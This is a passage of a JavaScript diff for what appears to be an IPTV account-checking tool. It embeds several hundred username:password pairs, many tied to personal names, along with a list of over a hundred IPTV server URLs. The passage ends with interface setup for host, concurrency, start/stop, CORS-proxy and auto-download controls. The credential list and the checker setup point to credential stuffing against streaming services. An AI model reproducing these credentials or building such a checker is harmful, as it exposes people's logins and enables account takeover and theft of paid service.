+JorgePuedmag:c72d39cfb155bb54
+Prime18:DtN2RpHvVQU5
+Tvibarra:26102025
+23M10:pBxKWtqwS7AR
+JonLlerena2024ggG:f576df14b7d03
+SaulVilla055:Villasagua055
+josegier2020k:josegier2020k
+ClienteCesar1m28ab:Muya78hmm7g
+Prigatv19:96PnC16u
+Cesarmaxi30:Cesarmaxi30
+Restream090:Nfnnr8374
+Jonathan17.:17.Jonathan
+Blas280:Blas180
+tvdigital880:LM7RX3YMT2
+T2ifjw908715:T2ifjw908715x
+FerCamu2:Gz4uwrP7cg3
+3C2CA67AA825:CA67AA8253C2
+12MPremiumAgo35:yZz2H2HELD
+6MPremiumSep21:LnAhWAWk8S
+gagF99NCgKcB2fW0:sgLESekUNW674miF
+9C00D3211DE0:00D3211DE09C
+Edenilson8777:T2xxEskjVsXq
+8k29wks32:818834432
+usuariocanales655:GSroWNZWux
+30rn49xsw:434087dm
+CompNv25:DyVFRT25
+Clienteflv5:b151cddc306d6e51
+3n73396s99:JpCM72gmCCyp
+JoseManorIPTVCLUB:NvCBryKRqZNK
+famytel65444:653345ggg
+ClienteLuisA1m30j:FPPjYkypaV
+9C00D37FA685:D37FA6859C00
+3MPremMesiasC25:552Xw7b9kV1z4nH
+NoelSamboIPTVCLUB:Rd5R5Dd2WZ
+BELISARIO31:1951agosto
+TvOsRCA5:iptvCAvAR25
+usuario20AB:6bhgw9ftmld
+12MPremiumAgo33:cqodEatAL6
+Mauricio1usa:Loja1usa
+Andregf10:Gfandre10
+Auracher21:83747ndrTRnf
+61101527306e:61101527306
+Repo003221025:241189
+12MPremiumSept39:bpDMnZ15Lw
+IplaySL0305:yksuV0n9cUeZBfkf
+3MPremiumSep57:uLeL9Gyaez
+FloG:6bZbebSYJrwz
+MARCELA29USA:b6da615c4442d1ca
+FDEGS72048:strmcs2521
+ClienteHugo1m2o:srJM2Rw68s
+JonathanSuarez1:SuarezJ10
+ruth2023k:4sWXQnY8FKea
+AnaArteaga:080503
+9C00D37FA503:0D37FA5039C0
+Cotes737hdff:737373vevrv
+2jw776hn:e3uWUwJubd5W
+mktvxi2683:ximkmp83
+ezpinozasmart88:miguelsmart77
+0305251anpo:8262638172
+Aldair41a:Aldair454a
+9C00D3211F0B:00D3211F0B9C
+9C00D3CF511C:D3CF511C9C00
+9C00D37FA5FF:D37FA5FF9C00
+eduardo63jean:6543283747jdnf1
+3MPremFranciaV25:muSLY6ZKpA
+7F4233793712:7F423379371
+138g789gf:24838873
+Anthony27393:Garcia28929
+LuisGomero:3055105630
+drodrig2121:bhMDmU6VdWcy
+Rd9wmf8w6:Rd9wmf8w61
+Maxcesar167:Rasectv761
+CSM_JORGENOVA:Jorgenovared
+DarioCastillo:dariomcs45
+Prigatv05:Jcahua5
+13e82y99:13232778
+JuanQuitoIPTVCLUB:YsW7pCYj6J
+CarlosVelasq10.:10.VCarlos
+IsabelBoteroIPTVCLUB:py7UUExUqeeY
+dat3792ve:yrjDckzDSaze
+jor99y2wa1:Hgxuxd2QHcBB
+12MPremiumMay39:0m9noHR1cED17940
+Prigatv02:aF29Hf92
+Generico10:TwsaFFRcA4tf
+titan171125:241189
+FranciscoOna:Leo2077
+CSM_JULIO:Julionova
+trem8370vx:nftxttGkzTvQ
+Josecastro32:TxAyggSZ34Yd
+AngelJaramillo:10090526
+Judith:Judith567
+Delsygf21:ngCBEuhEh8qj
+1f1e913968c6:1f1e913968c
+Met6876384:123reer987
+3MPremDarwinM25:HurfW8gfxe4E
+9C00D37FA6A2:0D37FA6A29C0
+IsidroValencia:1721132932
+usuario22JZ:4feug83uw
+7j1jr8dzcc:7j1jr8dzcc1
+12MPremiumFeb7:2a307e66434a3b9a
+ClienteVinicio1m9d:Vans87as5
+Juancarlos51:Carlosju51
+9C00D37FA6B7:D37FA6B79C00
+9C00D3CF53F3:D3CF53F39C00
+3MPremJorgeP25:6LFShuJ43z
+FffaCC7Zmk:N9wTHmDSe
+Josechp20:Sjaz8hU3z3cZ
+ClienteMateo2m25s:Nansn89ash
+novasandra25:javier25012javier
+VizmarWilmaarIPTVCLUB:m2wVSHk4kLEA
+82nf8wjrf7uw:8747359ssvv8
+Mebrb6152G:1234n94848
+DanielMendoza:Agrolab2019
+9C00D37FA8BF:0D37FA8BF9C0
+usuario30MM:3WVk5KwnLKef
+Ronald46:Ronald46a
+11d7f2e462e9:11d7f2e462e
+promoz15:promoz15
+GU7fCfbAhM9k:ZQzJgsh4nRAz
+PremiumNov30:zyRKuZQ2xcvA
+prf210823h2:uygqgddwcf
+TeXiJsEhUtN651:020TexJos
+95d68de19f7b:95d68de19f7
+8n39b46hc:8n39b46hc1
+9mQxLW8jGj5s:GekDyup9gYLR
+iz8vqCp9T:4BH6YQjTH
+AndreV2025:Sepodriaese
+JessicaMales02:ca58bfd9eed54985
+usuario12CT:XY9BXSjz5T
+ALciDNj5196:hczsc8gJxkhd
+novaamado0202:amado3004
+Taboadak0998:KleverT0876
+Ga82ncz89:Ga82ncz891
+7nov202573655:AHDF72654c
+ClienteLuisO1m15Ma:6K2qUcDhcnMv
+Miguelito27:Angelito27
+Matriz673:Tubular14
+ClienteRafael1m19f:Utv986gja26
+star8e1b2ea:a821earichm
+aguileradanie1:bdd606c01595
+barbarave1:aTp5MaRU8P
+juanuribe:60f6da48067e
+todo15712689278:zEskuZFux2
+Jonny0607:Fhwm26GsZd
+Ealleyne0119:AFVgDx92Au
+Ilerosa50:3953622f7e90
+YesicaO0845:072623f45678
+COLLADO25:yt67cKDfzY
+rosember01:jbVCQPKsN7
+Elcaleno25yu:KGWMuszAhJ
+willianroca:QIcy3gdAs9
+NAVAR25:dpyRHdKjgR
+BlackTVPrime0:8b6f3662f5cd
+Emanuel:6ksCHmR6dk
+johannabolanos210pro:BjQqDwrBJS
+jbachez02:1da683d3b1fd
+alex:KzBJAC5QTW
+KeiberC9842:WB57h4ANh3
+p@tiapa0825:XcUALzFJrm
+jesusgarcia1yu:eSHtArwJ3z
+elcema20:arwtZSsN5t
+112DDaNocolladl34ksSGatoPeroo:rrB7CBQxxc
+Oaach1970:8f95564b94da
+RobertoBalestriniIPTV3:8LYd9paaru
+PXgu5tavMi:9513c4bf4e98
+FabricioR9876:6580b6cac6a3
+JEscurra:d9f6af45c2b2
+PezMar24:QqQux91xly
+grandon:8rdUbvVrND
+noriega963:FbJwk24dkR
+a7fredov3r:3f2a5b1c5389
+554xSXUyh6:AkbADhg96K
+hernangrimal:rSETZMgCzD
+Elcastro27:5e673e628a26
+HaroldG2223:b45f6609b675
+Francotv:f5eb4a0853de
+neydapulgar:4LJWjCW6r2
+carlosarango1209:9fdd5c5c658c
+PabloOrellana:d8d860c93454
+Jose12CA:uU5jKnvGxR
+snajera2023:56d40dd2db42
+rJJygtAFT6:c6216d464da9
+rfajardo023yu:n2AkdwHJWz
+enok2376618:b3d326986c87
+SergioG8944:ebb50bd0d674
+REMACHE23:cf291a63b9eb
+Luisf21:uoejZchLLq
+juanageitos:Er6zaDbBBe
+R7SHJZkSRp:Nb94EkZVkV
+jameshiguita17:mQ3cUq5FVN
+LuisCenteno:QW2nKWRzF8
+angeldiaz1:VaTTEeQcFW
+hmedina027:GgqzVaW7kt
+Hermano30:LFsYRBLXj4
+viverosvaleria1:sXKUtKG7eT
+AMPlaza2022:bd359a824da9
+ministra1974:evkRPcrmDH
+m4ti45v3rg:wpxGDbreDU
+mariosiles:Z9CmvQ3g7p
+lainezgarcia1:ed740442285e
+4567DonaldSosa6544:4565DwO09875
+SEGURA25:qNmqhsjYuF
+OscRam06112019:dbd07f9580f1
+NodierCa29:c02bbed0da7f
+ElviaSanchez:SKdaApyPGB
+jydcaraudio03:ef5b25cbd63a
+Hernandez90002:MKxPWBNb3F
+paolo:bLj7UbcUpq
+usuariocanales123:HNkcuTpWsE
+mendozaalej2:3a6a94c311b3
+mvergara023:ADDTjLr8Gu
+EDUARDOERAS0562:8rYUpUxbJU
+gpucieuser1:qLNphv3QwE
+lianatognola:gfSqHFs93X
+MarthaM25:6kRuPTGxFH
+nestorandrade55:621e6d06f7ed
+deycagarcia1:PmppaC3HDm
+4rev47ojo5:kvsVWgY2LZ
+juanzuniga1:29ed9428cca2
+Sebas2026:zCSMQrmMEb
+LuiGal02132020:TbF6cAWHXk
+Juan1:F36dndCPsn
+Raultnew:kG8RTLaya9
+Urban2430:UDj57FCH72
+mhenao@1980:UB72PzFxtf
+Tigre2025cc:nn37Uck5H9
+VICACED25:aede7fd0bbd7
+Norma11CA:AEeVZCdRd5
+juliocoutotorres:6mUzwHoTyJ
+jaimemedina:WqAQfCE5Cf
+TVHD130:uSQYudcrH4
+LuisMora317:5rCdmgSPLt
+martinezorlando2:4971c47a0963
+JuanTEJ9557:hXQQ5ezZed
+chave21902:5d05dc03521a
+59899208303:e2388429f33a
+OCHOAW825:kvBPZ4gny4
+julioenrique293:6u7PvfJmD5
+genarovale1:y9FRJzvTDu
+Oscar1976:ddf0fde7427e
+Masterplayyx:rtFNUvCMzs
+katyyamil:LhzztmYfLg
+friaz85tv:ZVkTL2jbyk
+Azplayx0133:XBaYfLfCRs
+Y3bS2b9zKw:dqhAeKGqyK
+eddypinto:75bf7adc73e1
+GuillermoAM28:qEbeeNetzf
+MARV6G22:TBawkMrgxp
+Carloslon:ZqKMTwYYAa
+luismarin025:4TCkM75pZc
+HomezArturo:2c617b8d99ee
+USA33200300451:4mmNbzPmpz
+fabianolivera48:gKhbakRJTDbG
+cacosta628:6915e8b99294
+091264902:38dd333a204c
+Robin:a8a904be1364
+JoseA1921:mSMYKeE9W7
+julianleon15:nY5tyVBLsA
+SanchezMJorge:DyZbZEkDUY
+VIvianamarlinelli@65:M5tnnTtkGT
+crisvivan1:BuRpUPHt2o
+Hazard89:d32f9bd6e6fd
+allanmillan19:9df2c3f57e72
+AlvVel02282022:eab47de7b017
+GregorysGonzales034:Tj4p3zzJFy
+u94MBqp98U:uYXJzrD2CN
+YsU4K3P26N:W4M6NdeNd9
+fernandez3089:geJmSBY4RW
+cruzadoart1:6e73b04b1740
+Ybjgvs2026:4bea05a184f0
+martha90020:2EPe2Ug3zbm3u
+JonathanAlban174:298760a0513a
+Gabriel2026:8wjnsWkW6D
+Pd3nic3saN:DEQbZBHKsn
+luz2021:1dc24051c434
+Manny@Salazar26:FQseg4qCr4
+eugenio9890:3JVxvf36Zm
+NKycvP288L:9ENeaRVRRY
+usuariocanales107:094abe14bb7f
+Henca3:HvyBbembjB
+lucia5618565938:68a7b91f9d53
+JUAN0718:nfSXkG5qqW
+Walteraguilar:bcLSFeLbVX
+MARCOpizarBL:pNku4bYjrv
+Juan2025jg:E5Nvn3vPaj
+johanardila83:c4a745965b83
+JAaQZcMz2sux:auude6DHN7Nu
+byron2021:ab64fbf14a0e
+todo12408898750:JXfZyYjFZm
+RamonCastanos2202:pmfsjjJ2hf
+MiguelTiban2402:d3439ea29b55
+omaralvarez022:969c5746dfd9
+caguilar:c6e4114efe42
+JohnyL1975:8c0b3e64c2ee
+d9EhE8T9LE:18d5df11bdc4
+camilgnzlz2:T8sxKwgMQY
+Aronzambrano526:tmy3jjYV79
+8113256731:h6jV2xc4Ys
+ASoto1259YU:jDRvgGxV62
+099737101:95wSLcyPVt
+userjonasua1:KHnHwPKJPZ
+jorgemeza847:QmPM4ob6O9
+JAIMEURBina22:8fb15120fbec
+PaulCabrera:XupZk5gn9W
+nehemyregistre951:GHbxBcJ39h
+diogearrieta:NswB6YyCaz
+victor.jimenez:e64f47e35c55
+az6047:57d4fcdc5321
+amayartv1:T5Gy6qvRGU
+londolaura1:b0b972abd861
+1BwrTaWDcR:cc0f13a5f2b0
+villatoroadan1:3UhbATfhNe
+jgalvis2020:835e5d7f4f5d
+JoseRubio:Eg83KrkKSP
+Velezxyz:7Avm3MzQmS
+Filiberto1:1aa451fcbc3c
+USA3322010211:FcUTGpVB9Y
+ediilove9536251477:zczSfPCYyw
+aguilarafa1:ef8340a6bc34
+javier1771:ryjLQe5pca
+D82654Go72625a:aMTWBjuZXq
+63U76bbMef:H8M6PqJcTF
+jsilvaoperct:3fdc89e52305
+Mirtha16demes:ys8WEEEEyw
+israel8137:EQ9hSvVXw5
+JuaSan02182023:4ceeb3d610f7
+ranfusa2023:FAyHn2Brbq
+BerthaValen2405:4418b4b102b2
+CS001:SLDfKNSQSZ
+C5pvDr93Aeyu:KPKRVAFUJD
+LUPE25:Mn7rySUXUm
+tommybermejo1:mR3QPTngwm
+pastorgabrielquiroga:PyJLdLH366
+GAT254:BpFnR4DS8x
+DilanPadilla:tSrVNtpncs
+Eliud422500:30a4dd727750
+6561494145:7f7b4c9b2a60
+camaroncito28:mZrCCYt7DK
+manuellopez:UUkkMTuQP5b2
+ghernandez1:uRPbevDN6C
+ferlondono1IOJ:aVKQXHgYqK
+usuariocanales315:79852bda7d96
+luisvirla883369:Xre66LsWZ3
+lopezcarlos1:73ce63d61f13
+rammariel2:M4WmaMHHCD
+POLLO23:UJaUPssa2C
+eC8bxr3vKZ:PmcVtCeP9p
+MendezTigre:VWw2YFFuHy
+anllilo8221:Gw9cyaEDrD
+J44nP3r8:4TsJ9enGkU
+troncosogonzalez1:Lux6qSc52i
+MarcelaL6919:dsHUs6XNF3
+hectoralonso1:CRtcrHbzc8
+tolo77yu:dYJBb6Sytd
+martinperfecto2000tv:tqdsvyatX4
+michaelsarria:04e88a540467
+waltermasnchame:H3Wn99cshC
+ALopez042521:U4D2esgkwi
+byronmendieta:pmyyQ3ZUez
+asCGSZY6yu:606c2ee81521
+Caboq:DdEKLDwmBf
+tZoNTs3koU:DaD2jwuwyE
+Nery:d238e81c4f68
+zamorageorg1:ucAycF4UmZ
+pamelacolon1982:7MFWyVwWdU
+Alexanderusa:E9p4cHUDG4
+ARMBETT25:ZC6euQf7zX
+38SB9awQ3T:4c3b615643eb
+HAMMER106:47ALfK2prG
+adolfoh01:86kdu2Qzgd
+RudyGz26:aM3fnZqL3P8n
+sandraguiraldoyu:VzVTP7tND7
+masdara:JNmVdZy4zQ
+c4r7oj34nn:FJuZ3yfg28
+nohincapie01:c1767105749e
+Simontv:N7dZJf3LLs
+hmatias7248:ceQJ9F7YEN
+5678ChristianMiranda4567:51189ccf14f4
+povedamaria1:cc2c70de91af
+ronaldarauz81:cL2vAsPmkD
+yas2510:CWemdbrjGe
+achapotin:pGNeHbzBwu
+juanmarin:3dqKqjbfMU
+horaciovin1yu:DAstc2yFTe
+Diegovengadoryu:nwUxa2c9x5
+juanbgonz1:1165997f8c87
+RhiRey03172026:vH22DxDE7q
+rolanlopez1:bb3696255c6a
+a0209ultrapremium:9RCTh3MXNh
+jeffcoello5458:27vMZT2qrq
+OpenGamerstv01:dkgVky6JfhfT
+2601A0030:NPfueTzjP3
+JesusB5306:35301c7e0252
+JorgeF9619:G4jVpvGRVd
+drriencafe:cRvps3Kr3h
+luzapengao2yu:R9WZnp8AXg
+094270531:H5UffYNLpy
+fran34567ds3:fZSUZLWWbj
+usuariocanales117:yCKgHZRT5d
+f3rn4ndm4gyu:FuwJmzETDx
+Luisticoherrera315:vJ7gtMY8QA
+Jnsp16032025:3uau966VrM
+Mely1984:7dzWC7gYHx
+MARTINBurgos22:bf79eebb7aaf
+jorgeluis1:9hktwLLrLw
+JoseMazariegoProyectox:lQ9wzDcJBs
+BnkNqzNTto:43bb23ca8c3c
+gilbertobarrientos62:2rKqtmsUKasC
+joeltele1:V3NRM2XG8V
+francocamila1yu:vvqrsEYgLu
+2511A0001:RczVeSKTZK
+MyriamMinaIPTVCLUBTV2:zMNWWTtmA7
+NEVd6r2aHR:smuJJRw5Ky
+Chamberlan:8PfEGHCzrx
+kTQyrwtX2m:f01a8279b455
+ROSAGonz22:FQrrAtcf4y
+dianacasanas1:r8yLGM4pp7
+pegerojay1yu:BzRCh9hhRS
+GALLca23:4160bff8eb25
+DiegoGiron:45da404f2438
+ricardovergara0109:eeb0c6ef5905
+andresmaguzman:rg3pmDe2N5
+luis9782:48650bc2b804
+jonathanher1:79YoEqtHIy
+ignaciovillalba:9dab747e88fc
+w6eHZ4y2TS:9EHV6sFUBw
+lemusmike1:xqnkS6hRgS
+Wilfer15:dwNRkC5Lfd
+carlapaez025:d1a3e79e0ad7
+mir4mj4r4m:EXFjfQyuDL
+JoseZelaya:dQGEfAuPAY
+Richardtv84ur:4UfeZRR2Jx
+Milady:TDnusvZWsn
+michaele2803:5edd0913f118
+arturo903YU:3KU2vHMmfd
+andreinagarcia:d7a3f0cc8826
+Azplayx053:RJWQX53eHn
+CarlosPeru:cd539c48173f
+CriSDiAblO:e7e7fc350fbb
+josepernia1:cR9K9arrjZ
+clauidov:c6abac47f04f
+JonathanPerez:2KCFx6PYwj
+angeltv1:401397b85422
+Amipcif2503:HebExMFHgN
+17862087794:86d90480f4b0
+luca1962:563ef34522d7
+marpenaloza1yu:w4vS6y4LjQ
+Melchor90011:65KBZ4KEAW
+martinrovira2da:cxsA5aVB2F
+ClaudiaP:XpktkejSQy
+Mandujano88:YVphXjFXc9
+dkolunge:TUzRYrrxzn
+YolandaF0993:f2c070a271d7
+guanrrylagos1:4CYgJBuWVK
+DanielaNaula:gSwkbB7KCDDj
+Leal:T5nJMMfDgr
+adrian24:cmYudXrZLh
+L3on3LCov4:jfAv7LGR6p
+elmis1874:f07f260f7212
+kcQUa5NXkv:ZnXdP49LjD
+az6719:urkn77VgDj
+CarlosBalza2601:Y5ZBqfv4dU
+chatto2k:4cec9180d47c
+rauloza01:WKHuMeK3L5
+moraesjuan:BQLpfJy5Ag
+centaurusuio88:9qZfqqTaDM
+ySTKRZXje5yu:RSLqZtAmjn
+MatiasE3314:xwASAxpA25
+JSvG2RhE6q:Sb9jRvqZUf
+grestrepo:8cf632876a0e
+lopzvictor1:1c834784c80e
+ALexisHere:cc49d503b485
+juangil23YU:Urnka8P4pL
+RolandoP2025@:z5Hv92n6bH
+CCM4402yu:jNUEfrCqxf
+camilosaenz:eQQs89nZ7e
+Jesusmonte5678:9b107575b7ba
+maicolpacheco1:PACHECO51
+Morph:2ek2LVHG5r
+9179696355:gm25X6DhdU
+MenesesHomero:72a3ee41f47e
+p3n47oz4jo5:1adccaf79f03
+Pxfr4nS3r4:6qua98mChZ
+User2024tv-M:0b2f39bf8080
+juanpa08412:wNBTzMBzFq
+YENn19622:XJAdXrc2Vu
+JOIMER213:CW7rSjFXK5
+17n2B12n26Hz:0dc8be6dd63a
+Aura0569:sh5yVxxgkC
+AlejandroC7303:sVGyPt3Nd8
+yacergarcell:5a58ccbce502
+AKew2Vr9Yf:mmQJVAwpC6
+JoseRodriguez:29665150aa63
+mikequint1:TYAGkHVr65PE
+carlosorantestv2:Htq8WqSGSw
+agonzalez024:CauLb3pMay
+OpenGamers30:GFdhNnKk2V
+miguelandarcia:51d18f20e06a
+PezMeryz26:eU6NYrHQ3m9T
+hernricardo1:nnB83dV4dw
+aguilarluis1:qxMhd7J77b
+GOLDGeancarloGil413:2WDuh3M74T
+V0jzwFGdTH:7f4271c601f6
+crlsfranco1:baAk6jkNcp
+salbautistador:cNCXhTcrMb
+Mabelldictv:6zk74hvx8g
+KristhelNieto82:098167760d16
+Henry26:atwEgnaaWU
+jp8587:GmLMpma8SS
+victor18macias:PN4Yh4X9MB
+206Latin206:B8T29FxMKk
+Luisi24:5fa3fa4b3804
+freddymorloy:qaAPp5FzfA
+GLORIAbroadway21:aeec23adc312
+claudiaarias2:TZ75CDh9drr7
+Newfocus0224:bzVVHZQ8mk
+mateo9829:AcerNQUVVS
+Pablo-Villegas33:03e8e585860f
+jo53mont3s:870836f964b8
+MMsZt8NiiS:41b2805d03af
+Pervis19:ywyGarHJJn
+davidlopezsgd372:4d75cbe6607b
+edwindmoncaleano1:ydPYNvW2Gp
+harryzamora2:DV52vEzTUw
+minusculooyon112sass:cECeMLNhDj
+Riderjuarez1180:4Q6T2A8dSsEb
+MickyGarcia564:506a08281495
+az6709:bb6FHKzSqB
+GOLD10025:qBwewxbMvE
+2RenUce01062019:0579ce5d5775
+C4r7os73yv:dd2c6bf5fc3d
+FQuispe111220:vs5RqrXmsE
+Diego2026:bNZJhfAZKj
+VAcosta1121:SygSQrY8wh
+wLHNLZRQGJ:p5JtrEBpLd
+miguelmejia6933:nZ7xAuBqDz
+jbdgarcia6667:8fa2360aa68b
+khdcm:b3b01bbb5c81
+AlvaroT4261:7a7cacf6d076
+nVC6Y6V7kM:9bdf7cf003d1
+estelalemos23:estelalemos23
+Arnaldo:A2yezS29XZ
+Arlobran2024:t33yyF3Rcd
+franky:uw9bDEGBaM
+everistobonilla1:1dc3b371a8f8
+aguirresamuel:CPcYJ7v5PJ
+Nyc12520:88fw9zEUWz
+yXQaBYu8q7:32fd0ca33256
+RocioSaenz1903:9e0ebf878797
+CARACOST23:QdaPGrubYK
+jhosueescate1:0cba75feb003
+CarlosSoltero:qfubsYvC59
+Usuario3034:2f1a3c3858a7
+Albaricoque:ZBR7hC5zJB
+accfmft2026:45177aec4862
+x5SfJjPTU4:Y7kv7mgphF
+danielrivera452111:fXH4n2aqtZ
+JuanPrincipe74:4mHUfJXjj9
+Viofernandes0621:uNGEQD9HTT
+tommyguzman:4PRs5drvdD
+QqEJeDBD9d:xq2aAZrYtD
+salva1:cyLvVP94yy
+Lupe80:RWkjwFkbXF
+JuaGue03142021:a2d947ac9e3d
+anarestrepo2023:9f8912be6ced
+EnzoG1025:5f116c039fde
+oscarpalma59:RU3zHRuzeQ
+Korol24:0d8a21e70783
+JoseBAL4455:GfRXsYw9GM
+restrepohector1:WFLeYu4XsJ
+FFERMIN131:HcyWtgjWRR
+yahirdoparis543:54f8e20264bd
+JLPala0523:Pr6U8fxDy7
+roxanatv2020:WsbzNHXuuA
+guti2020:b2fc21c3ba83
+renato989:jmptSsZd8m
+fountain4527YU:qANvDzeNpu
+marialaura2:UcgYTuY4ZC
+Isaiastv:90ea44f1c6ca
+A7v4ro47za:LcCZ7BxUe9
+9aU66GKsZr:146bd6f5398d
+EDILMA:64e3148e5a8b
+CValverde100720:jgQ4ruChPw
+KatherineBar2601:ajpV8QC99j
+alonso.zambrano:cEKMuHebMb
+hectorsousa:72897e05c654
+johnalzate26:WmUHhDW9dC
+Jeaneska26:7R5QbpPv2MEH
+RafCar01022026:utSQK2GL7x
+r4monluc:d3749d356b89
+marlonvelasco3:gYMEAzLWhc
+micaela3571:50c9f0ba380e
+aizquierdo023:af428c384842
+pbunster2000:fFSHtz2gkE
+dorismarisolpalominogrados:VhaJb8ZhXW
+ReneMv21:c5dGp6GEXT
+tricomario:82bfa20a9977
+josemazuera025:ZrW9m3Hdd7
+Puyol895:EN68KKaGwa
+WILLIAM1416:c4b46fbe370f
+mendozaedwin1:4nRYqWQn3M
+USA3322030226:55881262a48f
+mario2025:zUeqgmDQyX
+AntonioB4674:ebb806fa3dc6
+Pxbro4nAs3:GSa6X75ca2
+qyQhwgTqyR:b2fd1277040a
+Lgodoy:mTCN3fT9Ke
+juansrubi1:aB8MSXrsTG
+lalocasanova2024aa:86744e83d606
+tato:bc1d768e8aa2
+333LatinTVPRO:uY7Q4TXs7Q
+dim45fr4nc:AuJ7NN8BT6
+PezJorgefavian25:m8YUCWWJMJ
+MarLop11302025:eBAcxDVkVy
+Camilamunoz:cd6a58d13b54
+jesusanzola20:49b765099360
+CLOWcALavE:533f1e22dbe3
+PezDaylin23:fb940ccf5095
+emcp:yreJDo0M4c
+Everardo67TT:Hielo79yyy565
+espinomiguel1YU:v4WGmh9teJ
+2603A0055:Y9Qwjm7uQHbS
+jamaya0701:44cdda112e8b
+gaby2060:5S2u7yYp4j
+renhernand1:ZmLaDyJVUn
+JhonUSA1444:hKcRmJvPmL
+darwin0723:cad1be9cd23e
+rakimys1:LbQtSy5eTE
+luzcantos:898YAjtBjz
+Escobar3:c77dd14d11b1
+usuariocanales091:32e2631929d4
+usgiovr0387:Scjds87VeH
+munozaleja2:UqukVVsvAZ
+2bety:CcTagg69h6
+omargtele1yu:ptap5aCT6r
+jEscalante1:mZkT8UthbM
+jucaocampo1:8e03116e546f
+animal8410:7D2zTzJr59
+KEVtorres7:uFD7txHgFR
+robertoastuillo:95vbanNQGn
+useronyee1:6ygFzrDtKX
+usluig0386:tpuWxTVZfT
+aviumawkid:6c51e6b10632
+flaviotv21:YrIFq1aXrg
+OscarHurtadoIPTVCLUB2:ppDpywZZ97
+todope12404772090b:e06927c8e0ad
+userkorozin1:MdAUBLybpy
+LUZCAR23:9fc05ca5a12f
+tapatio:KTpZQdtVCe
+JavierYY2025:hAZbWuavxz
+MarioKasoutoIPTVCLUB:HBMwKhzpVV
+Marco96:G8cvdzXnAR
+samaniegoebay:xbbMGurZmB
+RafaelVargas010:BmkqhrSrPT
+gustavohinca1:rzALrVZakH
+987ClaRosCasTellon965:ne78bGayYR
+Pxjor93P3r:JPwAsWm22R
+herreraalejandro:m7c5QDx2J4AJ
+Yasintv:381cfb4c598c
+alanmama2024:e251828c9932
+JuanR2k25:HZJ6etOzqG
+luzmarina3875YU:q92A3eUvGC
+e2idQXgVaS:b8bf15155ab9
+EdwGon06282019:1134057ff566
+m5tRbPNvu3:1ea3d45e281c
+2512A0012:uqMcaSsd5Y
+BVid2024:kZmjpjt2hT
+Henc2:nn3B7y4vyC
+JMartinez:r7JyPgEDRL
+USA3323010292:qXPtGBcyTE
+Joselivetv:SE3KEFKzATXE
+VILLest23:ae858b365b11
+awoosa:QWbSYyaukX
+joseflory:3Dtc5rWA67
+JFavela90262W:161UfJ6GKS
+juankx8812:U9rCEXd5ng
+Edna21:c2a61b438c14
+PabloMNewman:hTTcnYdUkv
+nandohelbling:4ea0abe2a938
+joeltv1new:xFs2b29abC
+Gustavo.Marisol:fCVyWXHbQ7
+SuperMateo23:e0b700b02b88
+luisg82mx:cb51108659f6
+Jmvss:s5CwpLf7xm
+Fern2023yu:6fdb5eaf8cda
+H7RsLnBMNQ:uD3ezmGxms
+molinadiego1:d05b8608f596
+ariagaever1:H73t4gzMP6
+Arturoreyes:9fjxpR7VFq
+Octavio12:db7b9f47575f`;
+
+// Lista de servidores (deduplicada)
+const RAW_SERVERS = ["http://daleplaytv.vip:80","http://tv.zapping.life:8080","http://Streamprime.vip:80","http://tv.proyectox.vip:8080","http://xc.adultiptv.net:80","http://cinemagold.club:80","http://admin.vlagor-iptv.com:8080","http://tv.nuevadomi.com:8080","http://mag.d60.co:2082","http://streamprime.vip:8880","http://tvbhmedia.co:8000","http://redworld.pro:8880","http://venuschiletv.lat:8880","http://canal-pro.xyz:8080","http://somoseluno.blog:80","http://duolatin.top:80","http://cinetvgo.com:80","http://campstvpro.com:80","http://daleplay.vip:80","http://liontv.es:80","http://sdmx.vip:80","http://livetv-plus.com:80","http://zafertv85.shop:8080","http://ip74.ddns.net:8081","https://dnslivetv.online:443","http://tv-privado.live:8080","http://infinitistreamapp.com:8080","http://norrothcc.top:8080","http://team.plus-stream.com:8080","http://totalplay.site:8080","http://tvum.vip:80","http://mtv.bo:80","http://osvaldo.ddnsgeek.com:2082","http://gama-mx.com:8085","http://ultrontv.xyz:80","http://accountv3289.smartgw.st:80","http://domestipo1.online:80","http://tv.zeuspro.xyz:2052","http://pacodigital10.chocoplus.xyz:8080","http://Supersonictv.live:8080","http://multinettv.pro:80","http://deluxe-tv.xyz:80","http://gxmax.biz:80","http://api.nerdtv.xyz:80","http://imaxplay.net:2082","http://fastream.xyz:8080","http://sinlimitestv.com:80","http://playpromax.xyz:80","http://newultra.xyz:8080","http://pixelmax.link:8080","http://7rota2apps.top:8080","http://vipbhbiss.top:8080","http://tvgusplay.online:80","http://fivetv.org:25461","http://ultrax.online:8080","http://zona593ec.online:8080","http://streamingtv.vip:80","http://6digital9.chocoplus.xyz:8080","http://ecuazona.live:80","http://live.detodotvplay.com:8080","http://micaplay.net:80","http://portal.iptvprivado.net:8080","http://smarterstv99.dynds.tv:25461","http://playtvpremium.xyz:8080","http://5.mdtv.me:80","http://s1.exabytetv.info:8080","http://gt.lomejortv.xyz:8080","http://portal.exabytetv.info:8080","http://vipgpno.top:8080","http://live.fuxxion.club:8080","http://latamplus.site:80","http://allinonestream.fans:8080","http://d.plmv.site:80","http://fultv.me:80","http://masterclic.org:8080","http://jmrk.xyz:8080","http://codetv.ovh:80","http://legiontv.online:8080","http://ultrapremium.cloud:8080","http://nxt.plus:8080","http://tvlatino.club:2082","http://ultra-premiun-pro.xyz:8080","http://peruplux.site:8080","http://veotv.site:80","http://justplay.best:8080","http://tvhomesmart.xyz:8080","http://play.steeltv.org:8080","http://amepz.xyz:2052","http://p2premiun.club:8080","http://xtream.lat:8080","http://bccdn.xyz:80","http://vipshoot.top:8080","http://premierchile.shop:8080","http://tvpremiun.pro:8080","http://b1g.ooo:80","http://ratax.in:8880","https://zona593ec.online","http://housery.top:8080","http://playcenter.app","http://1111.wf:80","http://atmosbr.online","http://loadbl2.online:80","http://bdta.pro","http://uniplay.link","http://testerosh.top:80","http://splaytv.club","http://xciptv.8888play.one","http://xciptv.aplicativos.top:80","http://xcloudsrv.us:2082","http://zeusplay.life:80"];
+const UNIQUE_SERVERS = [...new Map(RAW_SERVERS.map(s=>[s.trim(),s.trim()])).values()];
+
+// ========== INICIALIZAR DOM ==========
+const hostInput = document.getElementById('hostInput');
+const concurrencyInput = document.getElementById('concurrencyInput');
+const nickInput = document.getElementById('nickInput');
+const startBtn = document.getElementById('startBtn');
+const stopBtn = document.getElementById('stopBtn');
+const saveBtn = document.getElementById('saveBtn');
+const useCorsCheck = document.getElementById('useCors');
+const soundToggle = document.getElementById('soundToggle');
+const autoDownload = document.getElementById('autoDownload');
+const langSelect = document.getElementById('langSelect');
